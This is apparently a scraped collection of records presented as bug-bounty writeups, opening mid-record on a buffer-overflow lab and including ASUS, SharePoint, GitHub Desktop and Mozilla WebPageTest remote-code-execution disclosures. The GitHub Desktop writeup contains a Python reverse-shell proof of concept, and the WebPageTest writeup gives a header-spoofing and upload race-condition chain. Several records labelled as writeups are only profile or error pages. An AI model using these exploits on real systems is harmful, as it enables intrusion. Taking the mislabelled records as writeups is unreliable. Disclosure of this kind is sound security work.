Ubuntu's address randomization back on using: $ su root # /sbin/sysctl -w kernel.randomize_va_space=2 Running the attack described in the previous section gives a segmentation fault (core dumped) error because the address is randomized each time the program is executed. Therefore, the stack pointer is different and the exploit.c program will not set the address properly anymore for the buffer flow to run the shellcode. Stack Guard: a second defense To analyze one defense at a time, it is best to first turn off again address randomization, as performed in the initial setup. One can then repeat the buffer overflow attack but this time compiling the vulnerable program stack with the Stack Guard protection mechanism (i.e. removing the flag previously used: -fno-stack-protector ). su root gcc -o stack -z execstack stack.c This time, the Stack Guard option in gcc was able to allow us to detect the smashing attemp. This effectively terminates the program and prevents the attack. Here is a screen dump: *** stack smashing detected ***: ./stack terminated ======= Backtrace: ========= /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb7f240e5] /lib/i386-linux-gnu/libc.so.6(+0x10409a)[0xb7f2409a] ./stack[0x8048513] [0xbffff33c] [0x2f6850c0] ======= Memory map: ======== 08048000-08049000 r-xp 00000000 08:01 1582540 /home/***/Documents/stack 08049000-0804a000 r-xp 00000000 08:01 1582540 /home/***/Documents/stack 0804a000-0804b000 rwxp 00001000 08:01 1582540 /home/***/Documents/stack 0804b000-0806c000 rwxp 00000000 00:00 0 [heap] b7def000-b7e0b000 r-xp 00000000 08:01 2360149 /lib/i386-linux-gnu/libgcc_s.so.1 b7e0b000-b7e0c000 r-xp 0001b000 08:01 2360149 /lib/i386-linux-gnu/libgcc_s.so.1 b7e0c000-b7e0d000 rwxp 0001c000 08:01 2360149 /lib/i386-linux-gnu/libgcc_s.so.1 b7e1f000-b7e20000 rwxp 00000000 00:00 0 b7e20000-b7fc3000 r-xp 00000000 08:01 2360304 /lib/i386-linux-gnu/libc-2.15.so b7fc3000-b7fc5000 r-xp 001a3000 08:01 2360304 /lib/i386-linux-gnu/libc-2.15.so b7fc5000-b7fc6000 rwxp 001a5000 08:01 2360304 /lib/i386-linux-gnu/libc-2.15.so b7fc6000-b7fc9000 rwxp 00000000 00:00 0 b7fd9000-b7fdd000 rwxp 00000000 00:00 0 b7fdd000-b7fde000 r-xp 00000000 00:00 0 [vdso] b7fde000-b7ffe000 r-xp 00000000 08:01 2364405 /lib/i386-linux-gnu/ld-2.15.so b7ffe000-b7fff000 r-xp 0001f000 08:01 2364405 /lib/i386-linux-gnu/ld-2.15.so b7fff000-b8000000 rwxp 00020000 08:01 2364405 /lib/i386-linux-gnu/ld-2.15.so bffdf000-c0000000 rwxp 00000000 00:00 0 [stack] Aborted (core dumped) How to contact me Ways to get in touch with me: Twitter: https://www.twitter.com/nicolaspapernot Webpage: https://www.papernot.fr License This was adapted from a SEED lab. Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. About This is an example buffer overflow attack on a small vulnerable C program. Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 80 stars Watchers 3 watching Forks 51 forks Report repository Releases No releases published Packages 0 No packages published Languages C 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://mustafakemalcan.com/asus-rce-vulnerability-on-rma-asus-europe-eu/", "title": "How I hacked ASUS? | Mustafa Kemal Can", "friendly_explanation": "This is a bug bounty writeup from https://mustafakemalcan.com/asus-rce-vulnerability-on-rma-asus-europe-eu/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I hacked ASUS? | Mustafa Kemal Can Home Blog About How I hacked ASUS? Saturday. February 09, 2019 - 1 min Hello folks! Today I want to talk about ASUS RCE vulnerability on rma.asus-europe.eu domain. I was trying to fill out service apply form for my personal laptop. I had a screen issue. I realised that there is an upload part to upload some warranty documents. I was trying to bypass upload restrictions by editing request. I couldnt figure it out but it happened very fast! Because interestingly, Asus didn’t implement serious restrictions on upload part. Most of the rules were on front end part which are easy to bypass. Thanks to burp and our old null byte friend, I was able to bypass all upload restriction. The next mission was to find upload directory. I need to say thanks to ASUS developers, they helped me a lot. The directory was /uploads which is very easy to predict. Achievement unlocked! - ASUS RCE It is Microsoft-IIS 8.5, help me ASP! I used a very basic asp rce script for Microsoft-IIS 8.5 and it worked like a charm! I did not want to go further and quickly sent an email to the security@asus.com but they didnt give a shit for a while. After that they just fixed the issues and close it. There were no response to me. I sent lots of mails about issue and they decided to add my name on HoF list. But they didnt lol. I was need to create huge email traffic to do so. ASUS acts very rude about security, I am not happy. But finally, I’ve added HoF list by ASUS. « CyberArk EPM Privilege Escalation Vulnerability - CVE-2018-13052 Senate.gov open redirect vulnerability » Related Posts CyberArk EPM Privilege Escalation Vulnerability - CVE-2018-13052 CyberArk EPM file block bypass - CVE-2018-14894 First Touch Games database information leak ITSLEARNING VULNERABILITY STORIES - One more stored XSS ITSLEARNING XSS PART 2 Tweet Share rss facebook twitter github mail instagram linkedin Mustafa Kemal Can © rss facebook twitter github mail instagram linkedin"}
{"source_url": "https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/", "title": "Story of my two (but actually three) RCEs in SharePoint in 2018 | Soroush Dalili (@irsdl) Blog", "friendly_explanation": "This is a bug bounty writeup from https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStory of my two (but actually three) RCEs in SharePoint in 2018 | Soroush Dalili (@irsdl) Blog Skip to content Soroush Dalili (@irsdl) Blog A web application security ninja 🥷, a semicolon enthusiast! Menu Home Advisories Privacy Policy Bug Bounty Invites! SecProject Story of my two (but actually three) RCEs in SharePoint in 2018 I became interested in looking at .NET deserialization issues in Jan. 2018 when a work colleague (Daniele Costa) asked me whether I had worked with the ysoserial.net tool before (and the answer was a no!). I began to like it more and more just by looking at the generated payloads, and then by reading its useful references. It even answered one of the questions that I always had in mind: “ How can ViewState or EventValidation without MAC enabled lead to remote code execution? “; the answer was simple: “deserialization attacks using ObjectStateFormatter or LosFormatter”. I know I was late to the party but as the attack surface is huge, I managed to exploit a number applications including SharePoint without really having deep knowledge in this area. As mentioned in the MS 2018 Q4 – Top 5 Bounty Hunter for 2 RCEs in SharePoint Online post, I managed to exploit two RCEs in SharePoint Workflows that also affected SharePoint on-prem versions. Therefore, in addition to having a good bounty for the online version, I managed to get two CVEs in .NET Framework (CVE-2018-8284 and CVE-2018-8421). Details of these vulnerabilities were published in NCC Group’s website as can be seen here: Bypassing Workflows Protection Mechanisms – Remote Code Execution on SharePoint ( view PDF ) Bypassing Microsoft XOML Workflows Protection Mechanisms using Deserialisation of Untrusted Data ( view PDF ) The first one was a logical issue in the Workflows. This was the one with the epic Microsoft’s response: Technical Advisory: Bypassing Workflows Protection Mechanisms – Remote Code Execution on SharePoint Written by: @irsdl https://t.co/LbwofvDL1y pic.twitter.com/l7HlVmT9u0 — NCC Group Research & Technology (@NCCGroupInfosec) August 30, 2018 The second one however was a deserialisation issue that was not fully exploited on SharePoint until after the advisory was published. Here is the short story: If only there were some bounty left for a working RCE exploit … — Alvaro Muñoz (@pwntester) November 9, 2018 Which was shortly followed by a fully working exploit thanks to Alvaro’s tip: Blog post on XOML deserialization has been updated with a working SharePoint RCE (using CVE-2018-8421): https://t.co/8YlDorMvnR @NCCGroupInfosec @pwntester pic.twitter.com/eUPTiyl0Ul — Soroush Dalili (@irsdl) November 12, 2018 It should be noted that Microsoft had already given me the maximum bounty that is for an RCE issue even for the second one. Finally, 2018 was a good year for me on SharePoint finding 3 RCEs in it. If you are wondering what the third one was, the clue is in the ASP.NET resource files (.RESX) and deserialization issues post. I did not receive any bounty for it despite having a reverse shell on the Microsoft SharePoint Online server due to an ongoing engagement my company (NCC Group) had with them at the same time (unlucky me but I was lucky enough to be compensated by my company as they recognised my efforts). This entry was posted in Security Posts and tagged bug bounty , bugbounty , deserialisation , RCE , sharepoint on December 19, 2018 by Soroush Dalili . Post navigation ← ASP.NET resource files (.RESX) and deserialization issues Feel honoured to be there again after 8 years: Top 10 Web Hacking Techniques of 2017 → Twitter GitHub LinkedIn Search Search MongoDB NoSQL Injection with Aggregation Pipelines June 23, 2024 Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899 & CVE-2023-36560) August 8, 2023 Anchor Tag XSS Exploitation in Firefox with Target=”_blank” August 1, 2023 Thirteen Years On: Advancing the Understanding of IIS Short File Name (SFN) Disclosure! July 31, 2023 My MDSec Blog Posts so far in 2020/2021! October 31, 2020 File Upload Attack using XAMLX Files September 21, 2019 Uploading web.config for Fun and Profit 2 August 15, 2019 IIS Application vs. Folder Detection During Blackbox Testing July 9, 2019 Danger of Stealing Auto Generated .NET Machine Keys May 10, 2019 x-up-devcap-post-charset Header in ASP.NET to Bypass WAFs Again! May 4, 2019 Exploiting Deserialisation in ASP.NET via ViewState April 23, 2019 Yet Other Examples of Abusing CSRF in Logout April 23, 2019 How to win BIG and even more! April 17, 2019 Finding and Exploiting .NET Remoting over HTTP using Deserialisation March 26, 2019 More research on .NET deserialization December 19, 2018 Feel honoured to be there again after 8 years: Top 10 Web Hacking Techniques of 2017 December 19, 2018 Story of my two (but actually three) RCEs in SharePoint in 2018 December 19, 2018 ASP.NET resource files (.RESX) and deserialization issues August 12, 2018 MS 2018 Q4 – Top 5 Bounty Hunter for 2 RCEs in SharePoint Online August 12, 2018 WAF Bypass Techniques – Using HTTP Standard and Web Servers’ Behaviour August 12, 2018 Archives Select Year 2024 (1) 2023 (3) 2020 (1) 2019 (9) 2018 (9) 2017 (4) 2016 (1) 2015 (4) 2014 (6) 2013 (6) 2012 (10) 2011 (3) 2010 (13) 2009 (5) Blog Tags .Net Framework Anti-XSS bypass AntiXSS bypass ASP.NET bug bounty bugbounty bypass Challenge deserialisation deserialization ecommerce ExternalInterface ExternalInterface.call file upload file upload bypass file uploader bypass methods file uploader security bypass financial flash flash xss guideline iis IIS File Extension Security Bypass iis short file name IIS Tilde bug IIS tilde feature IIS tilde vulnerability jar protocol machine.config machinekey penetration testing RCE request encoding sharepoint Short name scanner SQL Injection Unrestricted File Download Unrestricted File Upload viewstate waf WAF bypass web.config XSS XSS Vulnerability ysoserial.net REDDIT Web Security Research HTTP/1.1 must die: the desync endgame August 6, 2025 /u/albinowax The Quiet Side Channel... Smuggling with CL.0 for C2 July 28, 2025 /u/t0xodile Broken Authorization in APIs: Introducing Autoswagger July 24, 2025 /u/tgifffff WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls July 18, 2025 /u/mc_security HTTP desync using via MITM using opportunistic TLS July 8, 2025 /u/albinowax Nonce CSP bypass using Disk Cache July 3, 2025 /u/albinowax DOMDOM Times #19: Can We Really Mitigate Client-Side Prototype Pollution by Using iframes? June 25, 2025 /u/canalun Novel SSRF Technique Involving HTTP Redirect Loops June 23, 2025 /u/albinowax Unexpected security footguns in Go's parsers June 21, 2025 /u/albinowax Funky chunks: abusing ambiguous chunk line terminators for request smuggling June 19, 2025 /u/General_Republic_360 Reddit netsec Channel Feed Vulnerability Management Program - How to implement SLA and its processes August 9, 2025 Theori AIxCC writeup , 0day in sqlite + more August 8, 2025 Blog: Exploiting Retbleed in the real world August 7, 2025 Consent & Compromise: Abusing Entra OAuth for Fun and Access to Internal Microsoft Applications August 7, 2025 Prompt injection engineering for attackers: Exploiting GitHub Copilot August 7, 2025 Exploit-DB Feed [remote] Microsoft Edge (Chromium-based) 135.0.7049.114/.115 - Information Disclosure [webapps] Gandia Integra Total 4.4.2236.1 - SQL Injection [webapps] Copyparty 1.18.6 - Reflected Cross-Site Scripting (XSS) [webapps] LPAR2RRD 8.04 - Remote Code Execution (RCE) [remote] Swagger UI 1.0.3 - Cross-Site Scripting (XSS) Privacy Policy Proudly powered by WordPress"}
{"source_url": "https://twitter.com/0xAsm0d3us", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://twitter.com/0xAsm0d3us. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSomething went wrong, but don’t fret — let’s give it another shot. Try again Some privacy related extensions may cause issues on x.com. Please disable them and try again."}
{"source_url": "https://github.com/devanshbatham", "title": "devanshbatham (Devansh Batham) · GitHub", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\ndevanshbatham (Devansh Batham) · GitHub Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham Follow Overview Repositories 31 Projects 0 Packages 0 Stars 295 More Overview Repositories Projects Packages Stars devanshbatham Follow ✨ Grepping Internet, One line at a time Devansh Batham devanshbatham ✨ Grepping Internet, One line at a time Follow Sponsor Grepping the internet, one line at a time 1.8k followers · 0 following India 14:13 (UTC +05:30) X @0xAsm0d3us Achievements x2 x4 Achievements x2 x4 Highlights Security Bug Bounty Hunter Organizations Block or Report Block or report devanshbatham Block user Prevent this user from interacting with your repositories and sending you notifications. Learn more about blocking users . You must be logged in to block users. Add an optional note: Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you. Block user Report abuse Contact GitHub support about this user’s behavior. Learn more about reporting abuse . Report abuse Overview Repositories 31 Projects 0 Packages 0 Stars 295 More Overview Repositories Projects Packages Stars devanshbatham / README .md Hey, It's Devansh ⚡ Writings ⚡ Prompt Injection Attacks for Dummies Fragility of The Internet: How Sacrificial Nameservers allowed potential DNS hijacking of 1.6+ million domains Horrors of DNS: A Tale of 1800 potential domain takeovers due to mistyped NS Trojan War against SOTA LLMs Projects 🏗️ ParamSpider - Mining URLs from dark corners of Web Archives for bug hunting/fuzzing/further probing FavFreak - Making Favicon.ico based Recon Great again OpenRedireX - A fuzzer for detecting open redirect vulnerabilities CertEagle - Weaponizing Live CT logs for automated monitoring of assets Quaithe - Quaithe empowers you to execute multiple commands in parallel for blazing-fast performance. DNSleuth - DNSleuth allows you to spy on the DNS queries your machine is making. Watson - Watson is a utility for note management and search from your terminal. ip2cloud - Check IP addresses against known cloud provider IP address ranges getresolvers - A simple utility to fetch freshly updated DNS resolvers revwhoix - A simple utility to perform reverse WHOIS lookups using whoisxml API heaptruffle - Mine URLs from Browser's Heap Snapshot for fun and profit ip2asn - A utility to quickly map IP addresses to their respective ASN revit - A command-line utility for performing reverse DNS lookups getsan - A utility to fetch and display dns names from the SSL/TLS cert data headerpwn - A fuzzer for finding anomalies and analyzing how servers respond to different HTTP headers dnsaudit - A command-line utility for auditing DNS configuration using Zonemaster API rayder - A lightweight tool for orchestrating and organizing your bug hunting recon / pentesting command-line workflows realm - A utility for recursively traversing SSL/TLS certificates for collecting DNS names Contact 📞 Twitter LinkedIn Pinned Loading Awesome-Bugbounty-Writeups Awesome-Bugbounty-Writeups Public A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Python 5.3k 1.1k ParamSpider ParamSpider Public Mining URLs from dark corners of Web Archives for bug hunting/fuzzing/further probing Python 2.8k 458 FavFreak FavFreak Public Making Favicon.ico based Recon Great again ! Python 1.2k 175 OpenRedireX OpenRedireX Public A fuzzer for detecting open redirect vulnerabilities Python 774 144 rayder rayder Public A lightweight tool for orchestrating and organizing your bug hunting recon / pentesting command-line workflows Go 294 37 headerpwn headerpwn Public A fuzzer for finding anomalies and analyzing how servers respond to different HTTP headers Go 344 38 Something went wrong, please refresh the page to try again. If the problem persists, check the GitHub status page or contact support . Uh oh! There was an error while loading. Please reload this page . Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/e13v3n-0xb", "title": "e13v3n-0xb (E13V3N-0xB) · GitHub", "friendly_explanation": "This is a bug bounty writeup from https://github.com/e13v3n-0xb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\ne13v3n-0xb (E13V3N-0xB) · GitHub Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert e13v3n-0xb Follow Overview Repositories 16 Projects 1 Packages 0 Stars 6 More Overview Repositories Projects Packages Stars e13v3n-0xb Follow 😎 Chiilin' E13V3N-0xB e13v3n-0xb 😎 Chiilin' Follow 56 followers · 8 following e13v3n-0xb.gitbook.io X @e13v3n_0xB Achievements Achievements Highlights Pro Block or Report Block or report e13v3n-0xb Block user Prevent this user from interacting with your repositories and sending you notifications. Learn more about blocking users . You must be logged in to block users. Add an optional note: Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you. Block user Report abuse Contact GitHub support about this user’s behavior. Learn more about reporting abuse . Report abuse Overview Repositories 16 Projects 1 Packages 0 Stars 6 More Overview Repositories Projects Packages Stars Popular repositories Loading awesome-courses awesome-courses Public Forked from prakhar1989/awesome-courses 📚 List of awesome university courses for learning Computer Science! 3 1 DVWA DVWA Public Damn Vulnerable Web Application 2 1 ctf ctf Public Forked from alirezaomidi/ctf Solutions to CTF problems. Python 1 1 reverse-engineering reverse-engineering Public Forked from wtsxDev/reverse-engineering List of awesome reverse engineering resources 1 Almstock Almstock Public This project is aimed at developing a web application that depicts the contribution of basic needs to underprivileged people. The website consists of a portal of donor, donee and the helper. The do… CSS 1 PHP_Sem6 PHP_Sem6 Public Something went wrong, please refresh the page to try again. If the problem persists, check the GitHub status page or contact support . Uh oh! There was an error while loading. Please reload this page . Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://pwning.re/2018/12/04/github-desktop-rce/", "title": "GitHub Desktop RCE (OSX) - 0xacb", "friendly_explanation": "This is a bug bounty writeup from https://pwning.re/2018/12/04/github-desktop-rce/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub Desktop RCE (OSX) - 0xacb 0xacb Posts Projects About Contact GitHub Desktop RCE (OSX) Bug Bounty Writeup Posted by 0xacb on December 04, 2018 · 6 mins read I was invited to H1-702 2018, a HackerOne live-hacking event in Las Vegas that paid over $500k dollars in bounties . One of the targets of this event was GitHub. I like to hack software I use everyday, because I already know lots of features in advance, so I felt GitHub would be a good target. I started playing with GitHub Desktop and found a way to achieve RCE in OSX. But, guess what? It was out of scope for the event! It’s also out of scope in the normal program , but you can read that “occasionally, exceptional reports are rewarded at our discretion on a case by case basis.” The Vulnerability You can find the public list of bug bounty hunters and vulnerabilities here: https://bounty.github.com/ I noticed that @zhuowei reported an RCE on GitHub Desktop last year: If something like this was reported previously, it’s probably safe to say that it is fixed. Maybe not in every OS? Well, you probably have seen this before: I started playing with x-github-client:// , which is the URI scheme used by GitHub Desktop. One of the supported actions in this URL is openRepo , which automatically opens a given file in a repository. If this repo doesn’t exist, the app prompts the user to clone it and then opens the file. Example: x-github-client://openRepo/https://github.com/github/training-kit?branch=master&filepath=README.md What if… we provide a filepath parameter like: \"../../../../../../../../../../../Applications/Calculator.app\" ? Opening an URL like this would pop a calculator, so at this point it was possible to escape the repository directory, and arbitrary apps or files could be opened in the filesystem. However, a respository can contain an app for OSX, which is basically a directory with the Application Bundle. First, I thought that OSX would be able to detect that this app was downloaded from the Internet. Since the app is cloned through Git the OS will not prompt the user to confirm this action. What’s the root cause of the problem? app/src/main-process/main.ts ... ipcMain . on ( ' show-item-in-folder ' , ( event : Electron . IpcMessageEvent , { path }: { path : string }) => { ... if ( stats . isDirectory ()) { openDirectorySafe ( path ) } else { shell . showItemInFolder ( path ) } ... app/src/main-process/shell.ts ... import { shell } from ' electron ' ; export function openDirectorySafe ( path : string ) { if ( __DARWIN__ ) { const directoryURL = Url . format ({ pathname : path , protocol : ' file: ' , slashes : true , }) shell . openExternal ( directoryURL ) } else { shell . openItem ( path ) } } In OSX, the directory path is converted to a file:/// URL and then the Electron function shell.openExternal() opens the URL in the desktop’s default manner. The PoC I built a simple reverse shell application for OSX with Pyinstaller and pushed it to my github-desktop-poc repository: import socket , subprocess , os ; os . system ( \" open -a calculator.app \" ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \" localhost \" , 1337 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \" /bin/sh \" , \" -i \" ]); If github-desktop-poc wasn’t cloned previously, the user would need to click clone , but the specified file would be opened immediately after this action. Otherwise, no interaction required, as shown in the second part of the video PoC. The attack scenario: An attacker can include an OSX app on his repository and distribute an evil link, for example in a README.md or in the page of a given project. He/She would be able to achieve remote code execution on the machines of GitHub Desktop users on OSX. A one-click RCE has the following requirements: The evil repository is already cloned Trusting GitHub Desktop URLs - Always open these types of links in the associated app ✓ The Fix Timeline 2018/08/19 Reported to GitHub via HackerOne #397045 2018/08/20 Triaged 2018/08/25 Fixed - GitHub Desktop v1.3.4 released 2018/08/27 Resolved and bounty awarded 2018/08/27 H1-702 2018 Bonus: unlimited private repositories coupon ❤️ ← Previous Post Next Post → Copyright © 0xacb 2025"}
{"source_url": "https://blog.assetnote.io/bug-bounty/2019/03/19/rce-on-mozilla-zero-day-webpagetest/", "title": "Discovering a zero day and getting code execution on Mozilla's AWS Network", "friendly_explanation": "This is a bug bounty writeup from https://blog.assetnote.io/bug-bounty/2019/03/19/rce-on-mozilla-zero-day-webpagetest/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDiscovering a zero day and getting code execution on Mozilla's AWS Network Assetnote has been acquired by Searchlight Cyber. Click here to learn more. Why Assetnote Platform What Powers Our Product Continuous Asset Discovery Get an unparalleled view of your environment in real-time Deep Asset Enrichment Contextualize and track assets as they evolve Assetnote Exposure Engine Identify high-signal exposures by the hour Expert Security Research Industry-leading offensive security research at your fingertips What Empowers Our Customers Collaborative Workflows Work together under one platform Customization Customize our platform to fit your needs Use Cases By Objective Continuous Asset Discovery and Inventory Stay up-to-date with your evolving attack surface Real-Time Exposure Monitoring Monitor and get high-signal findings Attack Surface Reduction Understand the full extent of your attack surface to reduce it Mergers & Acquisitions Don't inherit exposures of an acquired attack surface Bug Bounty Readiness Find all the low-hanging fruit for a more effective program By Surface Application & Infrastructure Assetnote covers all traditional EASM surfaces Cloud Platforms Assetnote secures the cloud platforms you rely on: AWS, GCP, Azure, and more! API Security Assetnote secures the API attack surface as it grows Company About Us Learn about who we are and why we do what we do. Careers Join us in our mission to build awesome security products. Resources Get the latest insights on Attack Surface Management here! Contact Meet with the Assetnote team and get your questions answered. Research Labs ASM Roles Request a Demo Research Notes Security Research March 19, 2019 Discovering a zero day and getting code execution on Mozilla's AWS Network No items found. Creative Commons license When Assetnote Continuous Security (CS) monitors your attack surface, one of the things it looks for are instances of WebPageTest . WebPageTest is a website performance testing tool that lets you test network related metrics for any given URL/host. Although basic authentication can be enabled by modifying the settings.ini file, and is recommended to prevent any anonymous access. Most deployments of WebPageTest that Assetnote CS identifies are unauthenticated, and the array of testing tools provided by WebPageTest can be used offensively to gain access to internal resources by server-side request forgery (commonly known as SSRF, but for WebPageTest, it is a feature). In November 2017, Assetnote CS discovered the following assets on Mozillaâs AWS environment: wpt-vpn.stage.mozaws.net wpt1.dev.mozaws.net Both of these were instances of WebPageTest did not require authentication, and it was the first time Assetnote CS had detected it for a bug bounty. Working with Mathias , we audited the source code, and in just a few hours we were able to create an attack chain that led to remote-code execution. While it was a zero day at the time of discovery, we worked with the Mozilla and WebPageTest team on getting the vulnerability fixed upstream. The commit which patches the bugs outlined in this blog post was pushed in this commit , on the 17th of January, 2018. The first thing in the codebase that caught our attention was the ability to upload and extract arbitrary Zip files via <span class=\"code_single-line\">/www/work/workdone.php</span>. This script contained some logic to restrict access from sources other than 127.0.0.1, as seen from the code snippet below: ... !strcmp($_SERVER['REMOTE_ADDR'], \"127.0.0.1\") ... Weâll come back to that later. In the same file, we found another potential vector - logic to upload an arbitrary Zip and have it extracted to a known location: Lines 133 - 136: /www/work/workdone.php if (isset($_FILES['file']['tmp_name'])) { ExtractZipFile($_FILES['file']['tmp_name'], $testPath); CompressTextFiles($testPath); } If we could spoof our IP to come from 127.0.0.1, it seems like we could get code execution through this vector. However, we found that itâs not as straightforward as we thought it was, due to Line 321 in /www/work/workdone.php : SecureDir($testPath); The logic of the <span class=\"code_single-line\">SecureDir</span> function can be found on Lines 2322 - 2347 in /www/common_lib.inc : /** * Make sure there are no risky files in the given directory and make everything no-execute * * @param mixed $path */ function SecureDir($path) { $files = scandir($path); foreach ($files as $file) { $filepath = \"$path/$file\"; if (is_file($filepath)) { $parts = pathinfo($file); $ext = strtolower($parts['extension']); if (strpos($ext, 'php') === false && strpos($ext, 'pl') === false && strpos($ext, 'py') === false && strpos($ext, 'cgi') === false && strpos($ext, 'asp') === false && strpos($ext, 'js') === false && strpos($ext, 'rb') === false && strpos($ext, 'htaccess') === false && strpos($ext, 'jar') === false) { @chmod($filepath, 0666); } else { @chmod($filepath, 0666); // just in case the unlink fails for some reason unlink($filepath); } } elseif ($file != '.' && $file != '..' && is_dir($filepath)) { SecureDir($filepath); } } } Since the SecureDir function occurs later during the code flow, there is an exploitable race condition where the PHP files that are extracted to the webserver were accessible for a short period of time before being deleted. The first pre-requesite of the chain was rather easy, as a valid test ID was obtained by running a Traceroute on <span class=\"code_single-line\">https://google.com</span> through the WebPageTest interface on <span class=\"code_single-line\">wpt-vpn.stage.mozaws.net</span>: Running a traceroute using WebPageTest After running the traceroute, WebPageTest redirected us to a URL that contained the test ID used in later steps: http://wpt-vpn.stage.mozaws.net/result/ 171124_GW_9/ â But we still needed to somehow spoof that we are <span class=\"code_single-line\">127.0.0.1</span> in order to access the vulnerable functions in this script. We were able to meet this condition by exploiting the following logic: Line 70: /www/common.inc if (isset($_SERVER[\"HTTP_FASTLY_CLIENT_IP\"])) $_SERVER[\"REMOTE_ADDR\"] = $_SERVER[\"HTTP_FASTLY_CLIENT_IP\"]; This allowed us as remote users to arbitrarily set <span class=\"code_single-line\">$_SERVER[\"REMOTE_ADDR\"]</span> by sending a <span class=\"code_single-line\">FASTLY-CLIENT-IP</span> request header set to <span class=\"code_single-line\">127.0.0.1</span>. Combining all of these elements together, we were able to set up two Burp Intruder attacks to finally get code execution. One Burp Intruder attack was used to upload a malicious Zip file, and another attempted to access the extracted PHP file, while it existed on the system. Our solution to exploiting the race condition at the time was to simply up Burp Intruderâs threads to ~200. Today, using tools 